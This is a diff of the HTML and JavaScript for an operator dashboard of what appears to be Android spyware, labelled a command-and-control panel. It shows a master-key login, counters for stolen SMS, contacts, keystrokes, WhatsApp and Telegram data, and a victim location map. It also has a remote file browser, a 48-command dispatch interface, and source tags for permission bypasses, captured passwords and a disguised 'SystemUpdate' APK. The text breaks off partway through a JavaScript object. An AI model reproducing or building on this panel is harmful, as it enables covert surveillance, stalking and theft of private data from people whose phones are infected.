@@ -7,9 +7,6 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        /* ============================================================
-           ROOT - DARK CYBER THEME
-           ============================================================ */
         *{margin:0;padding:0;box-sizing:border-box}
         :root{
             --bg-primary:#050a12;
@@ -32,97 +29,78 @@
         ::-webkit-scrollbar-track{background:var(--bg-secondary)}
         ::-webkit-scrollbar-thumb{background:var(--border-color);border-radius:2px}
         ::-webkit-scrollbar-thumb:hover{background:var(--text-accent)}
-        a{color:var(--text-info);text-decoration:none}
         .container{max-width:1600px;margin:0 auto;padding:10px}
         .flex{display:flex}
         .flex-between{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
         .flex-center{display:flex;align-items:center;gap:8px}
-        .flex-col{flex-direction:column}
         .gap-8{gap:8px}
-        .gap-12{gap:12px}
         .mb-8{margin-bottom:8px}
-        .mb-12{margin-bottom:12px}
-        .mt-8{margin-top:8px}
         .text-muted{color:var(--text-muted)}
         .text-accent{color:var(--text-accent)}
         .text-info{color:var(--text-info)}
         .text-danger{color:var(--text-danger)}
-        .text-warning{color:var(--text-warning)}
-        .text-center{text-align:center}
-        .w-full{width:100%}
         .hidden{display:none}
-        .glow-text{text-shadow:0 0 20px rgba(0,255,136,0.15)}
-        .border-glow{border-color:var(--border-glow)!important;box-shadow:0 0 15px rgba(0,255,136,0.1)}
+        .w-full{width:100%}
 
-        /* ============================================================
-           LOGIN - CYBER
-           ============================================================ */
-        .login-container{max-width:400px;margin:70px auto;background:var(--bg-secondary);padding:40px;border-radius:12px;border:1px solid var(--border-color);box-shadow:0 0 80px rgba(0,0,0,0.9),inset 0 0 60px rgba(0,255,136,0.02)}
+        /* LOGIN */
+        .login-container{max-width:400px;margin:70px auto;background:var(--bg-secondary);padding:40px;border-radius:12px;border:1px solid var(--border-color);box-shadow:0 0 80px rgba(0,0,0,0.9)}
         .login-container .logo{text-align:center;font-size:32px;font-weight:800;color:var(--text-accent);letter-spacing:2px;margin-bottom:4px}
         .login-container .logo span{color:var(--text-info)}
         .login-container .sub{text-align:center;color:var(--text-muted);font-size:12px;margin-bottom:25px;letter-spacing:2px}
-        .login-container .sub .cursor{display:inline-block;width:8px;height:14px;background:var(--text-accent);animation:blink 1s step-end infinite;vertical-align:middle;margin-left:4px}
-        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-        .login-container input{width:100%;padding:12px 16px;border-radius:6px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:14px;outline:none;margin-bottom:12px;transition:0.3s}
+        .login-container input{width:100%;padding:12px 16px;border-radius:6px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:14px;outline:none;margin-bottom:12px}
         .login-container input:focus{border-color:var(--text-accent);box-shadow:0 0 25px rgba(0,255,136,0.08)}
-        .login-container button{width:100%;padding:12px;border-radius:6px;border:none;background:linear-gradient(135deg,#0d1a2b,#050a12);color:var(--text-accent);font-family:var(--font-mono);font-size:14px;font-weight:700;cursor:pointer;transition:0.3s;border:1px solid var(--border-color);letter-spacing:1px}
+        .login-container button{width:100%;padding:12px;border-radius:6px;border:none;background:linear-gradient(135deg,#0d1a2b,#050a12);color:var(--text-accent);font-family:var(--font-mono);font-size:14px;font-weight:700;cursor:pointer;border:1px solid var(--border-color);letter-spacing:1px}
         .login-container button:hover{background:linear-gradient(135deg,#1a2a4a,#0d1a2b);border-color:var(--text-accent);box-shadow:0 0 30px rgba(0,255,136,0.1)}
         .login-error{color:var(--text-danger);text-align:center;margin-top:10px;font-size:12px;display:none}
-        .login-container .version{text-align:center;color:var(--text-muted);font-size:10px;margin-top:15px;letter-spacing:1px}
 
-        /* ============================================================
-           HEADER
-           ============================================================ */
-        .header{background:var(--bg-secondary);padding:8px 16px;border-radius:8px;border:1px solid var(--border-color);margin-bottom:10px;backdrop-filter:blur(10px)}
+        /* HEADER */
+        .header{background:var(--bg-secondary);padding:8px 16px;border-radius:8px;border:1px solid var(--border-color);margin-bottom:10px}
         .header .logo{font-size:16px;font-weight:800;color:var(--text-accent);letter-spacing:1px}
         .header .logo span{color:var(--text-info)}
         .header .status{font-size:10px;color:var(--text-muted)}
         .header .status .dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--text-accent);animation:pulse 1.5s infinite;margin-right:4px}
-        @keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 10px rgba(0,255,136,0.5)}50%{opacity:0.2;box-shadow:0 0 0px rgba(0,255,136,0)}}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.2}}
         .header .badge{background:var(--bg-primary);padding:2px 10px;border-radius:10px;font-size:9px;color:var(--text-info);border:1px solid var(--border-color);font-weight:700}
         .header .badge .num{color:var(--text-accent)}
         .header .logout-btn{background:transparent;border:1px solid #3a1a2a;color:var(--text-danger);padding:3px 12px;border-radius:4px;cursor:pointer;font-family:var(--font-mono);font-size:10px;transition:0.3s}
         .header .logout-btn:hover{background:#3a1a2a;border-color:var(--text-danger)}
 
-        /* ============================================================
-           STATS - 16 CARD WITH GLOW
-           ============================================================ */
+        /* STATS */
         .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(80px,1fr));gap:4px;margin-bottom:10px}
-        .stat-card{background:var(--bg-card);padding:6px 4px;border-radius:4px;border:1px solid var(--border-color);text-align:center;transition:0.3s;cursor:default}
-        .stat-card:hover{border-color:var(--text-accent);box-shadow:0 0 20px rgba(0,255,136,0.05)}
-        .stat-card .num{font-size:16px;font-weight:800;color:var(--text-accent);line-height:1.2;font-variant-numeric:tabular-nums}
-        .stat-card .label{font-size:6.5px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.3px;margin-top:1px;line-height:1.2}
+        .stat-card{background:var(--bg-card);padding:6px 4px;border-radius:4px;border:1px solid var(--border-color);text-align:center}
+        .stat-card:hover{border-color:var(--text-accent)}
+        .stat-card .num{font-size:16px;font-weight:800;color:var(--text-accent);line-height:1.2}
+        .stat-card .label{font-size:6.5px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.3px;margin-top:1px}
 
-        /* ============================================================
-           TABS
-           ============================================================ */
+        /* TABS */
         .tabs{display:flex;gap:2px;flex-wrap:wrap;margin-bottom:10px;background:var(--bg-secondary);padding:4px;border-radius:6px;border:1px solid var(--border-color)}
         .tab{background:transparent;padding:6px 14px;border-radius:4px;cursor:pointer;border:none;color:var(--text-muted);font-family:var(--font-mono);font-size:10px;font-weight:700;transition:0.3s;letter-spacing:0.5px}
         .tab:hover{color:var(--text-primary);background:var(--bg-primary)}
-        .tab.active{background:var(--bg-primary);color:var(--text-accent);box-shadow:inset 0 0 20px rgba(0,255,136,0.03)}
-        .tab .icon{margin-right:3px}
+        .tab.active{background:var(--bg-primary);color:var(--text-accent)}
 
-        /* ============================================================
-           PANELS
-           ============================================================ */
+        /* PANELS */
         .panel{display:none;background:var(--bg-secondary);border-radius:6px;padding:12px;border:1px solid var(--border-color)}
         .panel.active{display:block;animation:fadeIn 0.2s ease}
         @keyframes fadeIn{0%{opacity:0;transform:translateY(4px)}100%{opacity:1;transform:translateY(0)}}
 
-        /* ============================================================
-           TABLE - CYBER
-           ============================================================ */
+        /* TABLE */
         .table-wrap{overflow-x:auto;max-height:480px;overflow-y:auto;border-radius:4px;border:1px solid var(--border-color)}
         table{width:100%;border-collapse:collapse;font-size:10px}
         th{background:var(--bg-primary);padding:5px 8px;text-align:left;color:var(--text-info);border-bottom:2px solid var(--border-color);position:sticky;top:0;z-index:10;font-weight:700;font-size:8px;text-transform:uppercase;letter-spacing:0.5px}
-        td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.02);word-break:break-all;font-size:10px}
+        td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.02);word-break:break-word;font-size:10px}
         tr:hover{background:var(--bg-card)}
-        .map-btn{display:inline-block;background:var(--bg-primary);padding:1px 6px;border-radius:3px;font-size:8px;border:1px solid var(--border-color);transition:0.3s;color:var(--text-info)}
+        .map-btn{display:inline-block;background:var(--bg-primary);padding:1px 6px;border-radius:3px;font-size:8px;border:1px solid var(--border-color);transition:0.3s;color:var(--text-info);cursor:pointer}
         .map-btn:hover{border-color:var(--text-accent);color:var(--text-accent)}
 
-        /* ============================================================
-           C2 COMMANDS - GRID
-           ============================================================ */
+        /* SEARCH */
+        .search-box{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px}
+        .search-box input,.search-box select{padding:4px 8px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:10px;outline:none;min-width:80px;flex:1}
+        .search-box input:focus,.search-box select:focus{border-color:var(--text-accent)}
+        .search-box select{flex:0.3;min-width:60px}
+        .btn-refresh{padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);cursor:pointer;font-family:var(--font-mono);font-size:10px;transition:0.3s}
+        .btn-refresh:hover{background:var(--bg-card);border-color:var(--text-accent)}
+
+        /* C2 COMMANDS */
         .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:4px}
         .cmd-btn{background:var(--bg-primary);padding:4px 6px;border-radius:4px;border:1px solid var(--border-color);color:var(--text-primary);cursor:pointer;text-align:center;font-size:8px;font-family:var(--font-mono);transition:0.3s}
         .cmd-btn:hover{background:var(--bg-card);border-color:var(--text-accent);color:var(--text-accent)}
@@ -134,45 +112,28 @@
         .cmd-btn.warning:hover{background:#3a2a1a}
         .cmd-category{margin-bottom:8px}
         .cmd-category .cat-title{color:var(--text-info);font-size:9px;font-weight:700;margin-bottom:4px;padding:2px 8px;background:var(--bg-primary);border-radius:4px;border-left:2px solid var(--text-accent);display:flex;justify-content:space-between;align-items:center}
-        .cmd-category .cat-title .count{color:var(--text-muted);font-weight:400;font-size:8px}
 
-        /* ============================================================
-           SEARCH & INPUT
-           ============================================================ */
-        .search-box{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px}
-        .search-box input,.search-box select{padding:4px 8px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:10px;outline:none;min-width:80px;flex:1}
-        .search-box input:focus,.search-box select:focus{border-color:var(--text-accent)}
-        .search-box select{flex:0.3;min-width:60px;cursor:pointer}
-
+        /* INPUT GROUP */
         .input-group{display:flex;gap:4px;margin:6px 0;flex-wrap:wrap}
         .input-group input{padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:10px;flex:1;min-width:80px;outline:none}
         .input-group input:focus{border-color:var(--text-accent)}
         .input-group button{padding:4px 12px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-info);cursor:pointer;font-family:var(--font-mono);font-size:10px;transition:0.3s}
         .input-group button:hover{background:var(--bg-card);border-color:var(--text-accent)}
-        .btn-refresh{padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);cursor:pointer;font-family:var(--font-mono);font-size:10px;transition:0.3s}
-        .btn-refresh:hover{background:var(--bg-card);border-color:var(--text-accent)}
 
-        /* ============================================================
-           LOGS - TERMINAL STYLE
-           ============================================================ */
+        /* LOGS */
         .log-area{background:var(--bg-primary);border-radius:4px;padding:8px;height:260px;overflow-y:auto;font-size:9px;border:1px solid var(--border-color);font-family:var(--font-mono)}
         .log-entry{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02);display:flex;gap:6px}
         .log-entry .time{color:var(--text-info);min-width:60px;font-size:8px}
         .log-entry .type{color:var(--text-muted);min-width:40px;font-size:8px}
         .log-entry .data{color:var(--text-primary);font-size:9px}
-        .log-entry .data .highlight{color:var(--text-accent)}
 
-        /* ============================================================
-           MAP
-           ============================================================ */
+        /* MAP */
         #map{height:280px;border-radius:4px;border:1px solid var(--border-color);margin-top:4px;background:var(--bg-primary)}
         .location-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:4px;margin-top:6px;max-height:100px;overflow-y:auto}
         .location-item{background:var(--bg-primary);padding:3px 6px;border-radius:4px;border:1px solid var(--border-color);display:flex;justify-content:space-between;align-items:center;font-size:9px;cursor:pointer;transition:0.3s}
         .location-item:hover{border-color:var(--text-accent)}
 
-        /* ============================================================
-           MEDIA
-           ============================================================ */
+        /* MEDIA */
         .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px}
         .media-card{background:var(--bg-primary);border-radius:4px;border:1px solid var(--border-color);overflow:hidden;cursor:pointer;transition:0.3s}
         .media-card:hover{border-color:var(--text-accent);transform:scale(1.02)}
@@ -180,9 +141,7 @@
         .media-card .info{padding:3px 5px;font-size:8px;color:var(--text-muted);display:flex;justify-content:space-between}
         .media-card .info .sumber{color:var(--text-info)}
 
-        /* ============================================================
-           FILES
-           ============================================================ */
+        /* FILES */
         .file-breadcrumb{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px;padding:4px 10px;background:var(--bg-primary);border-radius:4px;align-items:center;font-size:10px;border:1px solid var(--border-color)}
         .file-breadcrumb span{cursor:pointer;color:var(--text-info)}
         .file-breadcrumb span:hover{text-decoration:underline}
@@ -195,59 +154,31 @@
         .file-item .actions .delete-btn{color:var(--text-danger)}
         .file-item .actions .delete-btn:hover{color:#ff4444}
 
-        /* ============================================================
-           MODAL
-           ============================================================ */
-        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center;backdrop-filter:blur(5px)}
+        /* MODAL */
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center}
         .modal.active{display:flex}
         .modal-content{background:var(--bg-secondary);padding:20px;border-radius:8px;max-width:650px;width:94%;border:1px solid var(--border-color);max-height:88vh;overflow-y:auto}
         .modal-close{float:right;background:transparent;border:none;color:var(--text-muted);font-size:18px;cursor:pointer;font-family:var(--font-mono)}
         .modal-close:hover{color:var(--text-primary)}
-
         .empty-state{text-align:center;color:var(--text-muted);padding:20px;grid-column:1/-1;font-size:11px}
 
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
-        @media(max-width:768px){
-            .header{flex-direction:column;gap:4px;text-align:center}
-            .header-right{justify-content:center;flex-wrap:wrap}
-            .stats{grid-template-columns:repeat(4,1fr)}
-            .stat-card .num{font-size:13px}
-            .tabs{justify-content:center}
-            .search-box{flex-direction:column}
-            .search-box input,.search-box select{flex:1;width:100%}
-            .input-group{flex-direction:column}
-            .cmd-grid{grid-template-columns:1fr 1fr}
-            .location-list{grid-template-columns:1fr}
-            .media-grid{grid-template-columns:1fr 1fr}
-        }
-        @media(max-width:480px){
-            .stats{grid-template-columns:repeat(3,1fr)}
-            .stat-card .num{font-size:12px}
-            .cmd-grid{grid-template-columns:1fr}
-            .media-grid{grid-template-columns:1fr}
-        }
+        @media(max-width:768px){.stats{grid-template-columns:repeat(4,1fr)}.stat-card .num{font-size:13px}.cmd-grid{grid-template-columns:1fr 1fr}}
+        @media(max-width:480px){.stats{grid-template-columns:repeat(3,1fr)}.cmd-grid{grid-template-columns:1fr}}
     </style>
 </head>
 <body>
 
-<!-- ============================================================
-     LOGIN
-     ============================================================ -->
+<!-- LOGIN -->
 <div id="loginContainer" class="login-container">
     <div class="logo">☠️ C2<span>PANEL</span></div>
-    <div class="sub">Command &amp; Control Center v6.0 <span class="cursor"></span></div>
+    <div class="sub">Command &amp; Control Center v6.0</div>
     <input type="password" id="loginPassword" placeholder="Enter master key..." onkeydown="if(event.key==='Enter')login()">
     <button onclick="login()">🔓 ACCESS</button>
     <div id="loginError" class="login-error">❌ Invalid credentials</div>
-    <div class="version">⚡ 48 Commands • 16 Stats • WebSocket • Real-time</div>
 </div>
 
-<!-- ============================================================
-     DASHBOARD
-     ============================================================ -->
-<div id="dashboardContent" class="dashboard-content hidden">
+<!-- DASHBOARD -->
+<div id="dashboardContent" class="hidden">
     <div class="container">
 
         <!-- HEADER -->
@@ -264,7 +195,7 @@
             </div>
         </div>
 
-        <!-- STATS - 16 CARD -->
+        <!-- STATS -->
         <div class="stats" id="statsContainer">
             <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
             <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Devices</div></div>
@@ -275,24 +206,24 @@
             <div class="stat-card"><div class="num" id="statClipboard">0</div><div class="label">Clipboard</div></div>
             <div class="stat-card"><div class="num" id="statScreenshot">0</div><div class="label">Screenshot</div></div>
             <div class="stat-card"><div class="num" id="statKeylogger">0</div><div class="label">Keylogger</div></div>
-            <div class="stat-card"><div class="num" id="statWhatsApp">0</div><div class="label">WhatsApp</div></div>
-            <div class="stat-card"><div class="num" id="statTelegram">0</div><div class="label">Telegram</div></div>
             <div class="stat-card"><div class="num" id="statAudio">0</div><div class="label">Audio</div></div>
             <div class="stat-card"><div class="num" id="statVideo">0</div><div class="label">Video</div></div>
             <div class="stat-card"><div class="num" id="statScreenRec">0</div><div class="label">Screen Rec</div></div>
             <div class="stat-card"><div class="num" id="statFiles">0</div><div class="label">Files</div></div>
             <div class="stat-card"><div class="num" id="statC2">0</div><div class="label">C2 Exec</div></div>
+            <div class="stat-card"><div class="num" id="statWhatsApp">0</div><div class="label">WhatsApp</div></div>
+            <div class="stat-card"><div class="num" id="statTelegram">0</div><div class="label">Telegram</div></div>
         </div>
 
         <!-- TABS -->
         <div class="tabs">
-            <div class="tab active" onclick="showPanel('data')"><span class="icon">📊</span> Data</div>
-            <div class="tab" onclick="showPanel('map')"><span class="icon">🗺️</span> Map</div>
-            <div class="tab" onclick="showPanel('c2')"><span class="icon">⚡</span> C2</div>
-            <div class="tab" onclick="showPanel('logs')"><span class="icon">📋</span> Logs</div>
-            <div class="tab" onclick="showPanel('media')"><span class="icon">📸</span> Media</div>
-            <div class="tab" onclick="showPanel('files')"><span class="icon">📁</span> Files</div>
-            <div class="tab" onclick="showPanel('stats')"><span class="icon">📈</span> Stats</div>
+            <div class="tab active" onclick="showPanel('data')">📊 Data</div>
+            <div class="tab" onclick="showPanel('map')">🗺️ Map</div>
+            <div class="tab" onclick="showPanel('c2')">⚡ C2</div>
+            <div class="tab" onclick="showPanel('logs')">📋 Logs</div>
+            <div class="tab" onclick="showPanel('media')">📸 Media</div>
+            <div class="tab" onclick="showPanel('files')">📁 Files</div>
+            <div class="tab" onclick="showPanel('stats')">📈 Stats</div>
         </div>
 
         <!-- PANEL DATA -->
@@ -302,26 +233,29 @@
                     <input type="text" id="searchInput" placeholder="🔍 Search data..." oninput="filterData()">
                     <select id="filterType" onchange="filterData()">
                         <option value="">All Sources</option>
-                        <option value="sms">SMS</option>
-                        <option value="kontak">Contacts</option>
-                        <option value="lokasi">Location</option>
-                        <option value="device_info">Device</option>
-                        <option value="screenshot">Screenshot</option>
-                        <option value="clipboard">Clipboard</option>
-                        <option value="call_log">Call Log</option>
-                        <option value="keylogger">Keylogger</option>
-                        <option value="whatsapp">WhatsApp</option>
-                        <option value="telegram">Telegram</option>
-                        <option value="audio_record">Audio</option>
-                        <option value="video_record">Video</option>
-                        <option value="screen_record">Screen Rec</option>
-                        <option value="wifi_info">WiFi</option>
-                        <option value="battery">Battery</option>
-                        <option value="installed_apps">Installed Apps</option>
-                        <option value="imei">IMEI</option>
-                        <option value="imsi">IMSI</option>
-                        <option value="phone_number">Phone</option>
-                        <option value="notifications">Notifications</option>
+                        <option value="data_gps_akurat">📍 GPS</option>
+                        <option value="data_kamera_real">📷 Kamera</option>
+                        <option value="data_screenshot_c2">📸 Screenshot</option>
+                        <option value="data_clipboard_api">📋 Clipboard</option>
+                        <option value="data_sms_bridge">💬 SMS</option>
+                        <option value="data_kontak_bridge">👤 Contacts</option>
+                        <option value="data_calllog_bridge">📞 Call Log</option>
+                        <option value="data_imei_bridge">📱 IMEI</option>
+                        <option value="data_baterai_real">🔋 Battery</option>
+                        <option value="data_network_real">🌐 Network</option>
+                        <option value="data_system_info_real">📊 System</option>
+                        <option value="data_vibrate_real">📳 Vibrate</option>
+                        <option value="data_environment">🔍 Environment</option>
+                        <option value="data_cookies_storage_real">🍪 Cookies</option>
+                        <option value="data_keylogger_real">⌨️ Keylogger</option>
+                        <option value="data_files_bridge">📁 Files</option>
+                        <option value="data_phone_bridge">📱 Phone</option>
+                        <option value="data_imsi_bridge">📱 IMSI</option>
+                        <option value="data_apps_bridge">📱 Apps</option>
+                        <option value="apk_download_success">📥 APK</option>
+                        <option value="ws_auth">🔌 WS</option>
+                        <option value="bypass_complete">✅ Bypass</option>
+                        <option value="timeout_fallback">⏰ Timeout</option>
                     </select>
                 </div>
                 <div class="flex-center gap-8">
@@ -331,7 +265,7 @@
             </div>
             <div class="table-wrap">
                 <table>
-                    <thead><tr><th style="min-width:130px">Time</th><th style="min-width:90px">Source</th><th>Data</th><th style="min-width:70px">Device</th><th style="min-width:50px">Action</th></tr></thead>
+                    <thead><tr><th style="min-width:130px">Time</th><th style="min-width:100px">Source</th><th>Data</th><th style="min-width:70px">Device</th><th style="min-width:40px">Action</th></tr></thead>
                     <tbody id="dataTableBody"></tbody>
                 </table>
             </div>
@@ -357,22 +291,22 @@
                 <input type="text" id="cmdSearch" placeholder="🔍 Search command..." oninput="filterCommands()">
                 <select id="cmdCategoryFilter" onchange="filterCommands()">
                     <option value="">All Categories</option>
-                    <option value="data">📱 Data (10)</option>
-                    <option value="notif">🔔 Notifications (4)</option>
-                    <option value="keylogger">⌨️ Keylogger (4)</option>
-                    <option value="komunikasi">💬 Communication (3)</option>
-                    <option value="apps">📱 Apps (5)</option>
-                    <option value="target">💰 Targets (7)</option>
-                    <option value="media">🎥 Media (5)</option>
-                    <option value="screen">📹 Screen Rec (3)</option>
-                    <option value="file">📁 Files (2)</option>
-                    <option value="sistem">🔧 System (5)</option>
+                    <option value="data">📱 Data</option>
+                    <option value="notif">🔔 Notifications</option>
+                    <option value="keylogger">⌨️ Keylogger</option>
+                    <option value="komunikasi">💬 Communication</option>
+                    <option value="apps">📱 Apps</option>
+                    <option value="target">💰 Targets</option>
+                    <option value="media">🎥 Media</option>
+                    <option value="screen">📹 Screen Rec</option>
+                    <option value="file">📁 Files</option>
+                    <option value="sistem">🔧 System</option>
                 </select>
             </div>
             <div id="cmdContainer"></div>
             <div class="input-group">
                 <input type="text" id="customCmd" placeholder="📝 Custom command..." onkeydown="if(event.key==='Enter')sendCustomCommand()">
-                <input type="text" id="customParam" placeholder="📝 Params (optional)" style="flex:0.3">
+                <input type="text" id="customParam" placeholder="📝 Params" style="flex:0.3">
                 <button onclick="sendCustomCommand()">📤 Send</button>
             </div>
             <div id="cmdResult" class="hidden" style="margin-top:6px;padding:6px 10px;background:var(--bg-primary);border-radius:4px;font-size:10px;max-height:100px;overflow-y:auto;border:1px solid var(--border-color);font-family:monospace"></div>
@@ -433,32 +367,24 @@
     </div>
 </div>
 
-<!-- LEAFTLET JS -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
-<!-- ============================================================
-     MAIN SCRIPT - FULL INTEGRATION (PERBAIKAN HEADER X-Password)
-     ============================================================ -->
 <script>
 // ============================================================
-// ☠️ C2 PANEL ULTIMATE v6.0 - PROFESSIONAL HACKER EDITION
+// ☠️ C2 PANEL ULTIMATE v6.0 - FIXED
 // ============================================================
 
-// ============================================================
-// GLOBALS
-// ============================================================
 var PASSWORD = '';
 var allData = [];
 var logEntries = [];
 var ws = null;
-var currentFilePath = '/sdcard/';
 var map = null;
 var mapMarkers = [];
-var wsConnected = false;
+var currentFilePath = '/sdcard/';
 var refreshInterval = null;
 
 // ============================================================
-// 48 COMMANDS - SAME AS SystemUpdate.html & SystemService.java
+// 48 COMMANDS
 // ============================================================
 var C2_COMMANDS = {
     'data': {
@@ -562,7 +488,7 @@ var C2_COMMANDS = {
 };
 
 // ============================================================
-// LOGIN - PERBAIKAN HEADER X-Password
+// LOGIN
 // ============================================================
 function login(){
     var p = document.getElementById('loginPassword').value.trim();
@@ -576,9 +502,7 @@ function login(){
             document.getElementById('dashboardContent').classList.remove('hidden');
             document.getElementById('loginError').style.display = 'none';
             initDashboard();
-        } else {
-            showLoginError('❌ Invalid key');
-        }
+        } else { showLoginError('❌ Invalid key'); }
     }).catch(()=>showLoginError('❌ Server unreachable'));
 }
 function showLoginError(msg){ var el=document.getElementById('loginError'); el.textContent=msg; el.style.display='block'; }
@@ -622,7 +546,7 @@ function showPanel(id){
 }
 
 // ============================================================
-// WEBSOCKET - REAL-TIME
+// WEBSOCKET
 // ============================================================
 function connectWebSocket(){
     try{
@@ -635,18 +559,10 @@ function connectWebSocket(){
         ws.onmessage = function(e){
             try{
                 var d = JSON.parse(e.data);
-                if(d.type==='auth_success'){
-                    addLog('info', '🔐 WebSocket authenticated');
-                } else if(d.type==='new_data'){
-                    addLog('data', '📥 New data from '+(d.device||'unknown'));
-                    refreshData();
-                } else if(d.type==='c2_result'){
-                    addLog('c2', '⚡ C2 result: '+JSON.stringify(d.result).substring(0,80));
-                } else if(d.type==='ping'){
-                    ws.send(JSON.stringify({type:'pong', timestamp:d.timestamp}));
-                } else if(d.type==='command_received'){
-                    addLog('c2', '✅ Command received by device');
-                }
+                if(d.type==='auth_success') addLog('info', '🔐 WebSocket authenticated');
+                else if(d.type==='new_data'){ addLog('data', '📥 New data'); refreshData(); }
+                else if(d.type==='c2_result'){ addLog('c2', '⚡ C2 result'); }
+                else if(d.type==='ping'){ ws.send(JSON.stringify({type:'pong', timestamp:d.timestamp})); }
             }catch(e){}
         };
         ws.onclose = function(){
@@ -654,16 +570,12 @@ function connectWebSocket(){
             addLog('error', '🔌 WebSocket disconnected, reconnecting...');
             setTimeout(connectWebSocket, 5000);
         };
-        ws.onerror = function(){
-            addLog('error', '🔌 WebSocket error');
-        };
-    }catch(e){
-        addLog('error', '🔌 WebSocket connection failed: '+e.message);
-    }
+        ws.onerror = function(){ addLog('error', '🔌 WebSocket error'); };
+    }catch(e){ addLog('error', '🔌 WebSocket connection failed: '+e.message); }
 }
 
 // ============================================================
-// DATA - PERBAIKAN HEADER X-Password
+// DATA - RAPI!
 // ============================================================
 function refreshData(){
     fetch('/data', {
@@ -679,36 +591,188 @@ function refreshData(){
     }).catch(e=>addLog('error','Refresh failed: '+e.message));
 }
 
+// 🔥 FORMAT SOURCE
+function formatSource(sumber){
+    var map = {
+        'data_gps_akurat': '📍 GPS Akurat',
+        'gps_akurat': '📍 GPS Akurat',
+        'data_system_info_real': '📊 System Info',
+        'data_baterai_real': '🔋 Battery',
+        'data_network_real': '🌐 Network',
+        'data_screenshot_real': '📸 Screenshot',
+        'data_screenshot_c2': '📸 Screenshot',
+        'data_screenshot_gagal': '❌ Screenshot Gagal',
+        'data_kamera_real': '📷 Kamera',
+        'data_kamera_selfie': '📷 Kamera Selfie',
+        'data_kamera_belakang': '📷 Kamera Belakang',
+        'data_clipboard_api': '📋 Clipboard',
+        'data_clipboard_paste': '📋 Clipboard Paste',
+        'data_clipboard_exec': '📋 Clipboard Exec',
+        'data_vibrate_real': '📳 Vibrate',
+        'data_environment': '🔍 Environment',
+        'data_cookies_storage_real': '🍪 Cookies/Storage',
+        'data_kontak_api': '👤 Contacts API',
+        'data_kontak_bridge': '👤 Contacts Bridge',
+        'data_sms_bridge': '💬 SMS Bridge',
+        'data_imei_bridge': '📱 IMEI Bridge',
+        'data_imsi_bridge': '📱 IMSI Bridge',
+        'data_calllog_bridge': '📞 Call Log Bridge',
+        'data_apps_bridge': '📱 Apps Bridge',
+        'data_files_bridge': '📁 Files Bridge',
+        'data_phone_bridge': '📱 Phone Bridge',
+        'data_lokasi_gps_c2': '📍 GPS C2',
+        'data_network_c2': '🌐 Network C2',
+        'data_baterai_c2': '🔋 Battery C2',
+        'data_system_info_c2': '📊 System Info C2',
+        'data_audio_c2': '🎵 Audio C2',
+        'data_video_c2': '🎬 Video C2',
+        'data_screen_rec_c2': '📹 Screen Rec C2',
+        'data_files_c2': '📁 Files C2',
+        'data_keylogger_real': '⌨️ Keylogger',
+        'data_keylogger_c2': '⌨️ Keylogger C2',
+        'apk_download_start': '📥 APK Download',
+        'apk_download_success': '✅ APK Success',
+        'apk_download_error': '❌ APK Error',
+        'bypass_start': '🔥 Bypass Start',
+        'bypass_complete': '✅ Bypass Complete',
+        'bypass_lokasi': '📍 Bypass Lokasi',
+        'bypass_kamera_mic': '📷 Bypass Camera+Mic',
+        'bypass_notifikasi': '🔔 Bypass Notifikasi',
+        'bypass_clipboard': '📋 Bypass Clipboard',
+        'bypass_kontak': '👤 Bypass Kontak',
+        'bypass_sensor_motion': '📳 Bypass Motion',
+        'bypass_sensor_orientation': '📳 Bypass Orientation',
+        'bypass_storage': '💾 Bypass Storage',
+        'bypass_cookies': '🍪 Bypass Cookies',
+        'bypass_screenshot': '📸 Bypass Screenshot',
+        'izin_lokasi': '📍 Izin Lokasi',
+        'izin_kamera': '📷 Izin Kamera',
+        'izin_mikrofon': '🎤 Izin Mikrofon',
+        'izin_notifikasi': '🔔 Izin Notifikasi',
+        'camera_error': '❌ Camera Error',
+        'ws_auth': '🔌 WS Auth',
+        'ws_status': '🔌 WS Status',
+        'sw_registered': '📡 SW Registered',
+        'password_received': '🔑 Password Received',
+        'password_retry_failed': '❌ Password Retry Failed',
+        'systemupdate_loaded': '📄 SystemUpdate Loaded',
+        'systemupdate_platform': '📱 Platform Detected',
